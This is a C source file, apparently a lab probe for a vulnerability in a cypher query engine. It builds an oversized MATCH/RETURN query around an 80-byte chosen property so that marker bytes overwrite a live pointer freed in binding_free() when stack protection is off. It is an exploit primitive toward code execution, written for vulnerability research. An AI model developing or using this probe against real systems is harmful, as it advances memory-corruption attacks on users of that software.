/*
 * codebasememory2shell — lab-only canary-off pointer probe (W23).
 *
 * Same direct call into the pinned cbm_cypher_execute() as harness.c, but the
 * 80-byte chosen property puts "GHIJKLMN" (or, with -DALT_CHOSEN, "ZZZZZZZZ")
 * at property offset 24..31. With -fno-stack-protector that offset lands in a
 * live pointer used by binding_free() at cypher.c:2290. This is a compiler-
 * configuration probe, NOT a claim about the pinned/canary build.
 */
#include "cypher/cypher.h"
#include "store/store.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef ALT_CHOSEN
static const char CHOSEN[] =
    "MISHE-OO" "0123456789ABCDEF" "ZZZZZZZZMNOPQRST" "WXYZabcdefghijkl" "mnopqrstuvwxyz01" "ABCDEFGH";
#else
static const char CHOSEN[] =
    "MISHE-OO" "0123456789ABCDEF" "GHIJKLMNOPQRSTUV" "WXYZabcdefghijkl" "mnopqrstuvwxyz01" "ABCDEFGH";
#endif

int main(int argc, char **argv) {
    int n = argc > 1 ? atoi(argv[1]) : 40;
    const char *kind = argc > 2 ? argv[2] : "RETURN";
    if (n < 1 || n > 512) {
        fprintf(stderr, "usage: %s N [RETURN|WITH]\n", argv[0]);
        return 2;
    }

    cbm_store_t *s = cbm_store_open_memory();
    if (!s) return 2;
    cbm_store_upsert_project(s, "test", "/tmp/test");

    cbm_node_t node = {.project = "test",
                       .label = "Function",
                       .name = CHOSEN,
                       .qualified_name = "test.HandleOrder",
                       .file_path = "handler.go",
                       .start_line = 10,
                       .end_line = 30};
    cbm_store_upsert_node(s, &node);

    char query[16384];
    size_t off = (size_t)snprintf(query, sizeof(query), "MATCH (f:Function) %s ", kind);
    for (int i = 0; i < n; i++) {
        off += (size_t)snprintf(query + off, sizeof(query) - off, "%sf.name%s", i ? ", " : "",
                                i == n - 1 && strcmp(kind, "WITH") == 0 ? " RETURN f.name" : "");
    }
    if (strcmp(kind, "WITH") != 0) query[off] = '\0';

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, query, "test", 0, &r);
    printf("KIND=%s ITEMS=%d RC=%d ROWS=%d COLS=%d QUERY_LEN=%zu ERR=%s\n", kind, n, rc,
           r.row_count, r.col_count, strlen(query), r.error ? r.error : "(none)");
    printf("CHOSEN_LEN=%zu CHOSEN=%s\n", strlen(CHOSEN), CHOSEN);
    fflush(stdout);
    cbm_cypher_result_free(&r);
    cbm_store_close(s);
    return 0;
}
